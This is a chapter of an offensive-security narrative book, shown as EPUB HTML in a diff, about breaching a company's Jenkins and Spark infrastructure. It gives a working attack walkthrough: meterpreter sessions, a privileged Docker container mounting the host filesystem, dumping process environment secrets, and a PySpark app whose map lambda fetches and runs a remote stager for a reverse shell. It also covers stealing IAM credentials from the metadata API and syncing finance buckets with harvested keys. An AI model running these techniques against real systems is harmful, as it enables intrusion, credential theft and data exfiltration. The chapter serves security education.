@@ -1,0 +1,772 @@
+<html><head></head><body>
+<section>
+<header>
+<h1 class="chapter">
+<span class="ChapterNumber"><span epub:type="pagebreak" title="199" id="Page_199"/>12</span><br/>
+<span class="ChapterTitle">Apotheosis</span></h1>
+</header>
+<figure class="opener">
+<img src="image_fi/book_art/chapterart.png" alt=""/>
+</figure>
+<p class="ChapterIntro">While we were fiddling around with our Lambda backdoor, someone at Gretsch Politico was kind enough to trigger the reverse shell nested in the <em>ecr-login.sh </em>script. Not once, but multiple times. Most sessions seemed to time out after about 30 minutes, so we need to be swift and efficient in assessing this new environment and finding novel ways of pivoting inside. We open one of the meterpreter sessions and spawn a shell on the remote machine:</p>
+<pre><code>meterpreter &gt; <b>shell</b>
+Channel 1 created.
+
+# <b>id</b>
+<span class="CodeAnnotationHang" aria-label="annotation1">1</span> uid=0(root) gid=0(root) groups=0(root)
+
+# <b>hostname</b>
+<span class="CodeAnnotationHang" aria-label="annotation2">2</span> e56951c17be0</code></pre>
+<p><span epub:type="pagebreak" title="200" id="Page_200"/>We can see that we’re running as root <span class="CodeAnnotation" aria-label="annotation1">1</span> inside a randomly named machine <span class="CodeAnnotation" aria-label="annotation2">2</span>. Yes, we are probably inside a container. Naturally, then, we run the <code>env</code> command to reveal any injected secrets, and we run the <code>mount</code> command to show folders and files shared by the host. We follow these commands with a couple of queries to the metadata API, requesting the IAM role attached to the machine (see <a href="#listing12-1" id="listinganchor12-1">Listing 12-1</a>).</p>
+<pre><code># <b>env</b>
+HOSTNAME=cef681151504
+GOPATH=/go
+PWD=/go
+GOLANG_VERSION=1.13.5
+# <b>mount</b>
+/dev/mapper/ubuntu--vg-root on /etc/hosts type ext4
+(rw,relatime,errors=remount-ro,data=ordered)
+
+<span class="CodeAnnotationHang" aria-label="annotation1">1</span> tmpfs on /var/run/docker.sock type tmpfs
+(rw,nosuid,noexec,relatime,size=404644k,mode=755)
+
+/dev/mapper/ubuntu--vg-root on /usr/bin/docker type ext4
+(rw,relatime,errors=remount-ro,data=ordered)
+
+# <b>apt install -y curl</b>
+# <b>curl 169.254.169.254/latest/meta-data/iam/security-credentials/</b>
+<span class="CodeAnnotationHang" aria-label="annotation2">2</span> ...&lt;title&gt;404 - Not Found&lt;/title&gt;...</code></pre>
+<p class="CodeListingCaption"><a id="listing12-1">Listing 12-1</a>: Output of the <code>env</code> and <code>mount</code> commands followed by a query to the metadata API</p>
+<p>No Kubernetes variables or orchestrator names stand out in the result of the <code>env</code> command. It seems like we are trapped inside a stand-alone container devoid of passwords or secrets in the environment. There’s not even an IAM role attached to the underlying machine <span class="CodeAnnotation" aria-label="annotation2">2</span>, but just a sneaky little <em>/var/run/docker.sock</em> <span class="CodeAnnotation" aria-label="annotation1">1</span> mounted inside the container itself, along with a Docker binary. So thoughtful of them!</p>
+<p>We can safely tuck away the ugly JSON one might use to directly query the <em>/var/run/docker.sock</em> via <code>curl</code> and promptly execute Docker commands to enumerate the currently running containers (see <a href="#listing12-2" id="listinganchor12-2">Listing 12-2</a>).</p>
+<pre><code># <b>docker ps</b>
+CONTAINER ID   IMAGE
+<span class="CodeAnnotationHang" aria-label="annotation1">1</span> e56951c17be0   983457354409.dkr.ecr.eu-west-1.amazonaws.com/
+               app-abtest:SUP6541-add-feature-network
+
+7f6eb2ec2565   983457354409.dkr.ecr.eu-west-1.amazonaws.com/datavalley:master
+
+8cbc10012935   983457354409.dkr.ecr.eu-west-1.amazonaws.com/libpredict:master
+<var>--snip--</var></code></pre>
+<p class="CodeListingCaption"><a id="listing12-2">Listing 12-2</a>: A list of containers running on the host</p>
+<p>We find that more than 10 containers are running on this machine, all pulled from the <em>983457354409.dkr.ecr.eu-west-1.amazonaws.com</em> Elastic <span epub:type="pagebreak" title="201" id="Page_201"/>Container Registry (ECR). We know the account ID 983457354409; we saw it authorized in the bucket policy of mxrads-dl. Our hunch was right: it was Gretsch Politico after all.</p>
+<p>All the containers found in <a href="#listing12-2">Listing 12-2</a> were lifted using a <code>master</code> tag, except for one: the <code>app-abtest</code> image <span class="CodeAnnotation" aria-label="annotation1">1</span>, which bears the curious tag <code>SUP6541-add-feature-network</code>.</p>
+<p>We might have an idea about what’s going on in this machine, but we still need one last piece of information before making a conclusion. Let’s get more information using the <code>docker info</code> command to display data about the host:</p>
+<pre><code># <b>docker info</b>
+Name: jenkins-slave-4
+Total Memory: 31.859GiB
+Operating System: Ubuntu 16.04.6 LTS
+Server:
+Containers: 546
+Running: 12
+<var>--snip--</var></code></pre>
+<p>Hello, Jenkins, our old friend. Now it all makes sense. We can guess that our payload is triggered by what we can assume are end-to-end test workloads. The job that triggered in this instance probably starts a container that authenticates to AWS ECR using the <em>ecr-login.sh</em> script and then lifts a subset of production containers, indicated by the <code>master</code> tag—<code>datavalley</code>, <code>libpredict</code>, and the rest—along with the experimental Docker image of the service to be tested: <code>ab-test</code>. That explains why it has a different tag than all the other containers.</p>
+<p>Exposing the Docker socket in this way is a common practice in test environments, where Docker is not so much used for its isolation properties, but rather for its packaging features. For example, Crane, a popular Docker orchestration tool (<a href="https://github.com/michaelsauter/crane/" class="LinkURL">https://github.com/michaelsauter/crane/</a>), is used to lift containers along with their dependencies. Instead of installing Crane on every single machine, a company may package it in a container and pull it at runtime whenever needed.</p>
+<p>From a software vantage point, it’s great. All jobs are using the same version of the Crane tool, and the server running the tests becomes irrelevant. From a security standpoint, however, this legitimizes the use of Docker-in-Docker tricks (Crane runs containers from within its own container), which opens the floodgates of hell and beyond.</p>
+<h2 id="h1-501263c12-0001">Persisting the Access</h2>
+<p class="BodyFirst">Test jobs can only last so long before being discarded. Let’s transform this ephemeral access into a permanent one by running a custom meterpreter on a new container we’ll label <code>aws-cli</code>:</p>
+<pre><code># <b>docker run \</b>
+<b>--privileged \</b>
+<span class="CodeAnnotationHang" aria-label="annotation1">1</span> <b>-v /:/hostOS \</b>
+<span epub:type="pagebreak" title="202" id="Page_202"/><b>-v /var/run/docker.sock:/var/run/docker.sock \</b>
+<b>-v /usr/bin/docker:/usr/bin/docker \</b>
+<b>-d 886477354405.dkr.ecr.eu-west-1.amazonaws.com/aws-cli</b></code></pre>
+<p>Our new reverse shell is running in a privileged container that mounts the Docker socket along with the entire host filesystem in the <em>/hostOS</em> <span class="CodeAnnotation" aria-label="annotation1">1</span> directory:</p>
+<pre><code>meterpreter &gt; <b>ls /hostOS</b>
+bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt
+opt  proc  root  run...</code></pre>
+<p>Let the fun begin!</p>
+<p>As we saw in Chapter 10, Jenkins can quickly aggregate a considerable amount of privileges due to its scheduling capabilities. It’s the Lehman Brothers of the technological world—a hungry entity in an unregulated realm, encouraged by reckless policymakers and one trade away from collapsing the whole economy.</p>
+<p>In this particular occurrence, that metaphorical trade happens to be how Jenkins handles environment variables. When a job is scheduled on a worker, it can be configured either to pull the two or three secrets it needs to run properly or to load every possible secret as environment variables. Let’s find out just how lazy Gretsch Politico’s admins really are.</p>
+<p>We single out every process launched by Jenkins jobs on this machine:</p>
+<pre><code>shell&gt; <b>ps -ed -o user,pid,cmd | grep "jenkins"</b>
+jenkins   1012   /lib/systemd/systemd –user
+jenkins   1013   sshd: jenkins@notty
+Jenkins   1276   java -XX:MaxPermSize=256m -jar remoting.jar...
+jenkins   30737  docker run --rm -i -p 9876:9876 -v /var/lib/...
+<var>--snip--</var></code></pre>
+<p>We copy the PIDs of these processes into a file and iterate over each line to fetch their environment variables, conveniently stored at the path <em>/prod/$PID/environ</em>:</p>
+<pre><code>shell&gt; <b>ps -ed -o user,pid,cmd \</b>
+<b>| grep "jenkins" \</b>
+<b>| awk '{print $2}' \</b>
+<b>&gt; listpids.txt</b></code></pre>
+<pre><code>shell&gt; <b>while read p; do \</b>
+<b>cat /hostOS/proc/$p/environ &gt;&gt; results.txt; \</b>
+<b>done &lt;listpids.txt</b></code></pre>
+<p>We upload our harvest to our remote server and apply some minor formatting, and then we enjoy the cleartext results (see <a href="#listing12-3" id="listinganchor12-3">Listing 12-3</a>).</p>
+<pre><code>root@Point1:~/#<span class="LiteralGray"> </span><b>cat results.txt</b>
+ghprbPullId = 1068
+SANDBOX_PRIVATE_KEY_PATH = /var/lib/jenkins/sandbox
+DBEXP_PROD_USER = pgsql_exp
+<span epub:type="pagebreak" title="203" id="Page_203"/>DBEXP_PROD_PAS  = vDoMue8%12N97
+METAMARKET_TOKEN = 1$4Xq3_rwn14gJKmkyn0Hho8p6peSZ2UGIvs...
+DASHBOARD_PROD_PASSWORD = 4hXqulCghprbIU24745
+SPARK_MASTER = 10.50.12.67
+ActualCommitAuthorEmail = Elain.ghaber@gretschpolitico.com
+BINTRAY_API_KEY = 557d459a1e9ac79a1da57$fbee88acdeacsq7S
+GITHUB_API = 8e24ffcc0eeddee673ffa0ce5433ffcee7ace561
+ECR_AWS_ID = AKIA76ZRK7X1QSRZ4H2P
+ECR_AWS_ID = ZO5c0TQQ/5zNoEkRE99pdlnY6anhgz2s30GJ+zgb
+<var>--snip--</var></code></pre>
+<p class="CodeListingCaption"><a id="listing12-3">Listing 12-3</a>: The results from collecting environment variables of jobs running on the Jenkins machine</p>
+<p>Marvelous. We scored a GitHub API token to explore GP’s entire codebase, a couple of database passwords to harvest some data, and obviously AWS access keys that should at least have access to ECR (the AWS container registry) or maybe even EC2, if we’re lucky.</p>
+<p>We load them on our server and blindly start exploring AWS services:</p>
+<pre><code>root@Point1:~/#<span class="LiteralGray"> </span><b>aws ecr describe-repositories \</b>
+<b>--region=eu-west-1 \</b>
+<b>--profile gretsch1</b>
+
+"repositoryName": "lib-prediction",
+"repositoryName": "service-geoloc",
+"repositoryName": "cookie-matching",
+<var>--snip--</var>
+
+root@Point1:~/#<span class="LiteralGray"> </span><b>aws ec2 describe-instances --profile gretsch1</b>
+An error occurred (UnauthorizedOperation)...
+
+root@Point1:~/#<span class="LiteralGray"> </span><b>aws s3api list-buckets --profile gretsch1</b>
+An error occurred (UnauthorizedOperation)...
+
+root@Point1:~/#<span class="LiteralGray"> </span><b>aws iam get-user --profile gretsch1</b>
+An error occurred (AccessDenied)...</code></pre>
+<p>We hit multiple errors as soon as we step outside of ECR. In another time, another context, we would fool around with container images, search for hardcoded credentials, or tamper with the production tag to achieve code execution on a machine—but there is another trail that seems more promising. It was buried inside the environment data we dumped in <a href="#listing12-3">Listing 12-3</a>, so let me zoom in on it again:</p>
+<pre><code>SPARK_MASTER = 10.50.12.67</code></pre>
+<p>The <code>SPARK</code> here indicates Apache Spark, an open source analytics engine. It might seem surprising to let the ECR access keys and database credentials slide by just to focus on this lonely IP address, but remember one of our original goals: getting user profiles and data segments. This type of data will not be stored in your average 100GB database. When fully enriched with <span epub:type="pagebreak" title="204" id="Page_204"/>all the available information about each person, and given the size of MXR Ads’ platform, these data profiles could easily reach hundreds if not thousands of terabytes.</p>
+<p>Two problems commonly arise when companies are dealing with such ridiculous volumes. Where do they store the raw data? And how can they process it efficiently?</p>
+<p>Storing raw data is easy. S3 is cheap and reliable, so that’s a no-brainer. Processing gigantic amounts of data, however, is a real challenge. Data scientists looking to model and predict behavior at a reasonable cost need a distributed system to handle the load—say, 500 machines working in parallel, each training multiple models with random hyperparameters until they find the formulas with the lowest error rate.</p>
+<p>But that raises additional problems. How can they partition the data efficiently among the nodes? What if all the machines need the same piece of data? How do they aggregate all the results? And most important of all: how do they deal with failure? Because there sure is going to be failure. For every 1,000 machines, on average 5, if not more, will die for any number of reasons, including disk issues, overheating, power outage, and other hazardous events, even in a top-tier datacenter. How can they redistribute the failed workload on healthier nodes?</p>
+<p>It is exactly these questions that Apache Spark aims to solve with its distributed computing framework. If Spark is involved in Gretsch Politico, then it’s most likely being used to process massive amounts of data that could very likely be the user profiles we are after—hence our interest in the IP address we retrieved on the Jenkins machine.</p>
+<p>Breaking into the Spark cluster would automatically empower us to access the raw profiling data, learn what kind of processing it goes through, and understand how the data is exploited by Gretsch Politico.</p>
+<p>As of this moment, however, there is not a single hacking post to help us shake down a Spark cluster (the same observation can be made about almost every tool involved in big data: Yarn, Flink, Hadoop, Hive, and so on). Not even an Nmap script to fingerprint the damn thing. We are sailing in uncharted waters, so the most natural step is to first understand how to interact with a Spark cluster.</p>
+<h3 id="h2-501263c12-0001">Understanding Spark</h3>
+<p class="BodyFirst">A Spark cluster is essentially composed of three major components: a master server, worker machines, and a driver. The driver is the client looking to perform a calculation; that would be the analyst’s laptop, for instance. The master’s sole job is to manage workers and assign them jobs based on memory and CPU requirements. Workers execute whatever jobs the master sends their way. They communicate with both the master and the driver.</p>
+<p>Each of these three components is running a Spark process inside a Java virtual machine (JVM), even the analyst’s laptop (driver). Here is the kicker, though: <em>security is off by default on Spark.</em></p>
+<p><span epub:type="pagebreak" title="205" id="Page_205"/>We are not only talking about authentication, mind you, which would still be bad. No, <em>security altogether</em> is disabled, including encryption, access control, and, of course, authentication. It’s 2021, folks. Get your shit together.</p>
+<p>In order to communicate with a Spark cluster, a couple of network requirements are needed according to the official documentation. We first need to be able to reach the master on port 7077 to schedule jobs. The worker machines also need to be able to initiate connections to the driver (our Jenkins node) to request the JAR file to execute, report results, and handle other scheduling steps.</p>
+<p>Given the presence of the <code>SPARK_MASTER</code> environment variable in <a href="#listing12-3">Listing 12-3</a>, we are 90 percent sure that Jenkins runs some Spark jobs, so we can be pretty confident that all these network conditions are properly lined up. But just to be on the safe side, let’s first confirm that we can at least reach the Spark master. The only way to test the second network requirement (that workers can connect to the driver) is by submitting a job or inspecting security groups.</p>
+<p>We add a route to the 10.0.0.0/8 range on Metasploit to reach the Spark master IP (10.50.12.67) and channel it through our current meterpreter session:</p>
+<pre><code>meterpreter &gt; <b>background</b>
+
+msf exploit(multi/handler) &gt;<b> route add 10.0.0.0 255.0.0.0 12</b>
+[*]  Route added</code></pre>
+<p>We then use the built-in Metasploit scanner to probe port 7077:</p>
+<pre><code>msf exploit(multi/handler) &gt;<b> use auxiliary/scanner/portscan/tcp</b>
+msf exploit(scanner/portscan/tcp) &gt;<b> set RHOSTS 10.50.12.67</b>
+msf exploit(scanner/portscan/tcp) &gt;<b> set PORTS 7077</b>
+msf exploit(scanner/portscan/tcp) &gt;<b> run</b>
+
+[+] 192.168.1.24:         - 192.168.1.24:7077 - TCP OPEN
+[*] Scanned 1 of 1 hosts (100% complete)</code></pre>
+<p>No surprises. We are able to communicate with the master. All right, let’s write our first evil Spark application!</p>
+<h3 id="h2-501263c12-0002">Malicious Spark</h3>
+<p class="BodyFirst">Even though Spark is written in Scala, it supports Python programs very well. There is a heavy serialization cost to pay for translating Python objects into Java objects, but what do we care? We only want a shell on one of the workers.</p>
+<p>Python even has a <code>pip</code> package that downloads 200MB worth of JAR files to quickly set up a working Spark environment:</p>
+<pre><code>$ <b>python -m pip install pyspark</b></code></pre>
+<p><span epub:type="pagebreak" title="206" id="Page_206"/>Every Spark application starts with the same boilerplate code that defines the <code>SparkContext</code>, a client-side connector in charge of communicating with the Spark cluster. We start our application with that setup code (see <a href="#listing12-4" id="listinganchor12-4">Listing 12-4</a>).</p>
+<pre><code>from pyspark import SparkContext, SparkConf
+
+# Set up configuration options
+conf = SparkConf()
+conf = conf.setAppName("Word Count")
+
+# Add the IP of the Spark master
+conf = conf.setMaster("spark://10.50.12.67:7077")
+
+# Add the IP of the Jenkins worker we are currently on
+conf = conf.set("spark.driver.host", "10.33.57.66")
+
+# Initialize the Spark context with the necessary info to reach the master
+<span class="CodeAnnotationHang" aria-label="annotation1">1</span> sc = SparkContext(conf = conf)</code></pre>
+<p class="CodeListingCaption"><a id="listing12-4">Listing 12-4</a>: Malicious Spark application setup code</p>
+<p>This Spark context <span class="CodeAnnotation" aria-label="annotation1">1</span> implements methods that create and manipulate distributed data. It allows us to transform a regular Python list from a monolithic object into a collection of units that can be distributed over multiple machines. These units are called <em>partitions</em>. Each partition can hold one, two, or three elements of the original list—whatever Spark deems to be optimal. Here we define such a collection of partitions composed of 10 elements:</p>
+<pre><code>partList = sc.parallelize(range(0, 10))</code></pre>
+<p>The <code>partList.getNumPartitions</code> returns <code>2</code> on my computer, indicating that it has split the original list into two partitions. Partition 1 likely holds 0, 1, 2, 3, and 4. Partition 2 likely holds 5, 6, 7, 8, and 9.</p>
+<p>The <code>partList</code> is now a collection of partitions. It’s a <em>resilient distributed dataset</em> <em>(RDD</em><em>)</em> that supports many iterative methods, known as Spark <em>transformations</em>, like <code>map</code>, <code>flatMap</code>, <code>reduceByKey</code>, and other methods that will transform the data in a distributed manner. Code execution seems like a long shot from MapReduce operations, but bear with me: it will all tie up together nicely.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	A <code>map</code> is a method that, given a list, (1, 2, 3, 4, . . . <em>n</em>), and a method, F, will return a new list: (F(1), F(2), . . . F(<em>n</em>)). A <code>flatMap</code> is a method that, for each element, may return zero, one, or more objects. So, for a given list, (1, 2, 3. . . <em>n</em>), and a method, F, <code>flatMap</code> may only return (F(1)) or (F(2), F(3)). F(2) can be a single element or another list.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p><span epub:type="pagebreak" title="207" id="Page_207"/>Before continuing with our Spark app, I’ll give an example of using the <code>map</code> API to loop over each element of the partitions, feed them to the function <code>addTen</code>, and store the result in a new RDD (see <a href="#listing12-5" id="listinganchor12-5">Listing 12-5</a>).</p>
+<pre><code>def addTen(x):
+    return x+10
+plusTenList = partList.map(addOne)</code></pre>
+<p class="CodeListingCaption"><a id="listing12-5">Listing 12-5</a>: Using the <code>map</code> API on Spark</p>
+<p>Now <code>plusTenList</code> contains (10, 11, . . .). How is this different from a regular Python map or a classic loop? Say, for example, we had two workers and two partitions. Spark would send elements 0 through 4 to machine #1 and elements 5 through 9 to machine #2. Each machine would iterate over the list, apply the function <code>addTen</code>, and return the partial result to the driver (our Jenkins machine), which then consolidates it into the final output. Should machine #2 fail during the calculation, Spark would automatically reschedule the same workload on machine #1.</p>
+<p>At this point, I am sure you’re thinking, “Great. Spark is awesome, but why the long lecture on maps and RDDs? Can’t we just submit the Python code as is and execute code?”</p>
+<p>I wish it were that simple.</p>
+<p>See, if we just append a classic call to <code>subprocess.Popen</code> and execute the script, we’ll just—well, you can see for yourself in <a href="#listing12-6" id="listinganchor12-6">Listing 12-6</a>.</p>
+<pre><code>from pyspark import SparkContext, SparkConf
+from subprocess import Popen
+
+conf = SparkConf()
+conf = conf.setMaster("spark://10.50.12.67:7077")
+conf = conf.set("spark.driver.host", "10.33.57.66")
+
+sc = SparkContext(conf = conf)
+partList = sc.parallelize(range(0, 10))
+print(Popen(["hostname"], stdout=subprocess.PIPE).stdout.read())
+
+$ <b>python test_app.py</b>
+891451c36e6b
+
+$ <b>hostname</b>
+891451c36e6b</code></pre>
+<p class="CodeListingCaption"><a id="listing12-6">Listing 12-6</a>: The Python code executes code locally instead of sending it to the Spark cluster.</p>
+<p>When we run our test app, we get returned the ID of our own container. The <code>hostname</code> command in the Python code was executed on our system. It did not even reach the Spark master. What happened?</p>
+<p>The Spark driver, the process that gets initialized by PySpark when executing the code, does not technically send the Python code to the master. <span epub:type="pagebreak" title="208" id="Page_208"/>First, the driver builds a <em>directed acyclic graph</em><em> (DAG</em><em>)</em>, which is a sort of summary of all the operations that are performed on the RDDs, like loading, <code>map</code>, <code>flatMap</code>, storing as a file, and so on (see <a href="#figure12-1" id="figureanchor12-1">Figure 12-1</a>).</p>
+<figure>
+<img src="image_fi/501263c12/f12001.png" alt="f12001"/>
+<figcaption><p><a id="figure12-1">Figure 12-1</a>: Example of a simple DAG composed of two steps: parallelize and map</p></figcaption></figure>
+<p>The driver then registers the workload on the master by sending a few key properties: the workload’s name, the memory requested, the number of initial executors, and so forth. The master acknowledges the registration and assigns Spark workers to the incoming job. It shares their details (IP and port number) with the driver, but no action follows. Up until this point, no real computation is performed. The data still sits on the driver’s side.</p>
+<p>The driver continues parsing the script and adding steps to the DAG, when needed, until it hits what it considers to be an <em>action</em>, a Spark API that forces the collapse of the DAG. This action could be a call to display an output, save a file, count elements, and so on (you can find a list of Spark actions at <a href="http://bit.ly/3aW64Dh" class="LinkURL">http://bit.ly/3aW64Dh</a>). Then and only then will the DAG be sent to the Spark workers. These workers follow the DAG to run the transformations and actions it contains.</p>
+<p>Fine. We upgrade our code to add an action (in this case, a <code>collect</code> method) that will trigger the app’s submission to a worker node (see <a href="#listing12-7" id="listinganchor12-7">Listing 12-7</a>).</p>
+<pre><code>from pyspark import SparkContext, SparkConf
+--<var>snip</var>--
+partList = sc.parallelize(range(0, 10))
+Popen(["hostname"], stdout=subprocess.PIPE).stdout.read()
+
+for a in finalList.collect():
+    print(a)</code></pre>
+<p class="CodeListingCaption"><a id="listing12-7">Listing 12-7</a>: Adding an action to the malicious Spark application</p>
+<p>But we’re still missing a crucial piece. Workers only follow the DAG, and the DAG only accounts for RDD resources. We need to call Python’s <code>Popen</code> in order to execute commands on the workers, yet <code>Popen</code> is neither a Spark transformation like <code>map</code> nor an action like <code>collect</code>, so it will be omitted from the DAG. We need to cheat and include our command execution inside a Spark transformation (a map, for instance), as shown in <a href="#listing12-8" id="listinganchor12-8">Listing 12-8</a>.</p>
+<pre><code>from pyspark import SparkContext, SparkConf
+from subprocess import Popen
+
+<span epub:type="pagebreak" title="209" id="Page_209"/>conf = SparkConf()
+conf = conf.setAppName("Word Count")
+conf = conf.setMaster("spark://10.50.12.67:7077")
+conf = conf.set("spark.driver.host", "10.33.57.66")
+
+sc = SparkContext(conf = conf)
+partList = sc.parallelize(range(0, 1))
+finalList = partList.map(
+<span class="CodeAnnotationHang" aria-label="annotation1">1</span>     lambda x: Popen(["hostname"], stdout=subprocess.PIPE).stdout.read()
+)
+for a in finalList.collect():
+    print(a)</code></pre>
+<p class="CodeListingCaption"><a id="listing12-8">Listing 12-8</a>: Skeleton of the full app executing code on a Spark cluster</p>
+<p>Instead of defining a new named function and calling it iteratively via <code>map</code> (like we did in <a href="#listing12-5">Listing 12-5</a>), we instantiate an anonymous function with the prefix <code>lambda</code> that accepts one input parameter (each element iterated over) <span class="CodeAnnotation" aria-label="annotation1">1</span>. When the worker loops over our RDD to apply the <code>map</code> transformation, it comes across our <code>lambda</code> function, which instructs it to run the <code>hostname</code> command. Let’s try it out:</p>
+<pre><code>$ <b>python test_app.py</b>
+19/12/20 18:48:46 WARN NativeCodeLoader: Unable to load native-hadoop library for your
+platform... using builtin-java classes where applicable
+
+Using Spark's default log4j profile: org/apache/spark/log4j-defaults.properties
+
+Setting default log level to "WARN".
+To adjust logging level use sc.setLogLevel(newLevel). For SparkR, use setLogLevel(newLevel).
+
+ip-172-31-29-239</code></pre>
+<p>There you go! We made contact with the master. A nice, clean command execution, and as promised, at no point in time did Spark bother asking us for credentials.</p>
+<p>Should we relaunch the program, our job might get scheduled on another worker node altogether. This is expected and is, in fact, at the heart of distributed computing. All nodes are identical and have the same configuration (IAM roles, network filters, and so on), but they will not necessarily lead the same life. One worker may receive a job that spills database credentials to disk, while another sorts error messages.</p>
+<p>We can force Spark to distribute our workload to <em>n</em> machines by building RDDs with <em>n</em> partitions:</p>
+<pre><code>partList = sc.parallelize(range(0, 10), 10)</code></pre>
+<p>We cannot, however, choose which ones will receive the payload. Time to set up a permanent resident on a couple of worker nodes.</p>
+<h3 id="h2-501263c12-0003"><span epub:type="pagebreak" title="210" id="Page_210"/>Spark Takeover</h3>
+<p class="BodyFirst">To keep our malicious app in play, we want to diligently instruct Linux to spawn it in its own process group, in order to ignore interrupt signals sent by the JVM when the job is done. We also want the driver to wait a few seconds, until our app finishes establishing a stable connection to our attacking infrastructure. We need to add these lines to our app:</p>
+<pre><code><var>--snip--</var>
+finalList = partList.map(
+    lambda x: subprocess.Popen(
+        "wget https://gretsch-spark-eu.s3.amazonaws.com/stager &amp;&amp;  chmod +x         ./stager &amp;&amp; ./stager &amp;",
+        shell=True,
+        preexec_fn=os.setpgrp,
+    )
+)
+finalList.collect()
+time.sleep(10)
+
+$ <b>python reverse_app.py</b>
+<var>--snip--</var></code></pre>
+<p>On our attacking infrastructure, we open Metasploit and wait for the app to ring back home:</p>
+<pre><code>[*] https://0.0.0.0:443 handling request from...
+[*] https://0.0.0.0:443 handling request from...
+msf exploit(multi/handler) &gt; <b>sessions -i 7</b>
+[*] Starting interaction with 7...
+
+meterpreter &gt; <b>execute -i -f id</b>
+Process 4638 created.
+Channel 1 created.
+
+<span class="CodeAnnotationHang" aria-label="annotation1">1</span> uid=1000(spark) gid=1000(spark)
+groups=1000(spark),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),
+110(lxd),115(lpadmin),116(sambashare)...</code></pre>
+<p>Fantastic! We made it to one of the workers. We’re running as a regular Spark user <span class="CodeAnnotation" aria-label="annotation1">1</span>, which was trusted enough to be included in the <em>sudo</em> group. No complaints from this side of the screen. Let’s explore this new entourage by dumping environment variables, mounted folders, IAM roles, or anything else that might be useful:</p>
+<pre><code>meterpreter &gt; <b>execute -i -H -f curl -a \</b>
+<b>http://169.254.169.254/latest/meta-data/iam/security-credentials</b>
+
+spark-standalone.ec2
+
+meterpreter &gt; <b>execute -i -H -f curl -a \</b>
+<b>http://169.254.169.254/latest/meta-data/iam/security-credentials/spark-\</b>
+<span epub:type="pagebreak" title="211" id="Page_211"/><b>standalone.ec2</b>
+"AccessKeyId" : "ASIA44ZRK6WSS6D36V45",
+"SecretAccessKey" : "x2XNGm+p0lF8H/U1cKqNpQG0xtLEQTHf1M9KqtxZ",
+"Token" : "IQoJb3JpZ2luX2VjEJL//////////wEaCWV1LXdlc3QtM...</code></pre>
+<p>We learn that Spark workers can impersonate the spark-standalone.ec2 role. Like with most IAM roles, it’s hard to know the full extent of its privileges, but we can pick up some clues using the <code>mount</code> command:</p>
+<pre><code>meterpreter &gt; <b>execute -i -H -f mount</b>
+<var>--snip--</var>
+s3fs on /home/spark/notebooks type fuse.s3fs (rw, nosuid, nodev...)
+fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
+<var>--snip--</var></code></pre>
+<p>GP seems to use s3fs to locally mount an S3 bucket in <em>/home/spark/notebooks</em>. We dig up the name of the bucket from the list of processes (using the <code>ps</code> command enriched with the <code>-edf</code> argument):</p>
+<pre><code>meterpreter &gt; <b>execute -i -H -f ps -a "-edf"</b>
+<var>--snip--</var>
+spark  14067 1  1 2018  00:51:15  s3fs gretsch-notebooks /home/spark/notebooks -o iam_role
+<var>--snip--</var></code></pre>
+<p>Bingo. The bucket mapped to the <em>notebooks</em> folder is named gretsch-notebooks. Let’s load the role’s credentials and explore this bucket:</p>
+<pre><code>root@Point1:~/#<span class="LiteralGray"> </span><b>aws s3api list-objects-v2 \</b>
+<b>--bucket-name gretsch-notebooks \</b>
+<b>--profile spark</b>
+
+"Key": "jessie/Untitled.ipynb",
+"Key": "leslie/Conversion_Model/logistic_reg_point.ipynb",
+"Key": "marc/Experiment – Good logistics loss cache.ipynb",
+<var>--snip--</var></code></pre>
+<p>Interesting indeed. The bucket contains files with <em>.ipynb</em> extensions, the hallmark of Python Jupyter notebooks. A Jupyter notebook is like a web-based Python command line interface (CLI) designed for data scientists to easily set up a working environment with the ability to graph charts and share their work. These notebooks can also be easily hooked to a Spark cluster to execute workloads on multiple machines.</p>
+<p>Data scientists need data to perform their calculations. Most would argue that they need production data to make accurate predictions. This data lives in places like databases and S3 buckets. It’s only natural, then, that these once-barren Jupyter notebooks quickly evolved into a warm pond teeming with hardcoded credentials as the scientists had the need for more and more datasets.</p>
+<p><span epub:type="pagebreak" title="212" id="Page_212"/>Let’s sync the whole bucket and begin to look for some AWS credentials. All AWS access key IDs start with the magic word <code>AKIA</code>, so we <code>grep</code> for that term:</p>
+<pre><code>root@Point1:~/#<span class="LiteralGray"> </span><b>aws s3 sync s3://gretsch-notebooks ./notebooks</b>
+
+root@Point1:~notebooks/# <b>grep -R "AKIA" -4 *</b>
+yuka/Conversion_model/...  awsKeyOpt =
+Some(\"AKIAASJACEDYAZYWJJM6D5\"),\n",
+yuka/Conversion_model/...  awsSecretOpt =
+Some(\"3ceq43SGCmTYKkiZkGrF7dr0Lssxdakymtoi14OSQ\")\n",
+<var>--snip--</var></code></pre>
+<p>Well, how about that! We collect dozens of personal AWS credentials, probably belonging to the whole data department of Gretsch Politico.</p>
+<p>Let’s also search for occurrences of the common S3 drivers used in Spark, <code>s3a</code> and <code>s3n</code>, and uncover some precious S3 buckets regularly used to load data and conduct experiments:</p>
+<pre><code>root@Point1:~notebooks/# <b>egrep -R "s3[a|n]://" *</b>
+<span class="CodeAnnotationHang" aria-label="annotation1">1</span> s3a://gretsch-finance/portfolio/exports/2019/03/ report1579446047119.csv
+s3a://gretsch-hadoop/engine/aft-perf/...
+s3a://gretsch-hadoop-us1/nj/media/engine/clickthrough/...
+s3a://gretsch-hadoop-eu1/de/social/profiles/mapping/...
+<var>--snip--</var></code></pre>
+<p>Look at that first bucket’s name: gretsch-finance <span class="CodeAnnotation" aria-label="annotation1">1</span>. That ought to be fun. We’ll use one of the AWS keys we retrieved from the same notebook and unload the keys under <em>portfolio/exports/2020</em>:</p>
+<pre><code>root@Point1:~/# <b>aws s3 sync \</b>
+<b>s3://gretsch-finance/portfolio/exports/2020/ ./exports_20/ --profile data1</b>
+
+root@Point1:~/# <b>ls exports_20/</b>
+./01/report1548892800915.csv
+./02/report1551319200454.csv
+./03/report1551578400344.csv
+./04/report1553997600119.csv
+<var>--snip--</var></code></pre>
+<p>Let’s sample a random file:</p>
+<pre><code>root@Point1:~/# <b>head ./03/report1551578400344.csv</b>
+annual revenue, last contact, initial contact, country, account,
+zip code, service purchased, ...
+0.15, 20191204, 20180801, FRW nation, BR, 13010, 5...
